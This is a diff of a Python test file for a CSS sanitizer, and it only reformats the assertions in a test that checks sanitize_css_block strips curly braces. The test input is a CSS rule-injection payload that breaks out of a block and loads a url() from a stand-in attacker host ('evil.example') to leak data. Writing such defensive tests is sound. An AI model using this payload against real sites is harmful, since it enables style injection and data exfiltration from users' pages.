@@ -16,7 +16,6 @@ from checktick_app.core.theme_utils import (
     sanitize_font_family,
 )
 
-
 # ---------------------------------------------------------------------------
 # F16 — sanitize_css_block must strip { } as well as < >
 # ---------------------------------------------------------------------------
@@ -39,12 +38,12 @@ def test_sanitize_css_block_strips_curly_braces():
     """
     payload = "} [data-theme='custom'] { background: url(https://evil.example/?leak=) }"
     out = sanitize_css_block(payload)
-    assert "{" not in out, (
-        f"sanitize_css_block must strip `{{` to prevent rule injection; got: {out!r}"
-    )
-    assert "}" not in out, (
-        f"sanitize_css_block must strip `}}` to prevent rule breakout; got: {out!r}"
-    )
+    assert (
+        "{" not in out
+    ), f"sanitize_css_block must strip `{{` to prevent rule injection; got: {out!r}"
+    assert (
+        "}" not in out
+    ), f"sanitize_css_block must strip `}}` to prevent rule breakout; got: {out!r}"
 
 
 def test_sanitize_css_block_preserves_safe_css_values():
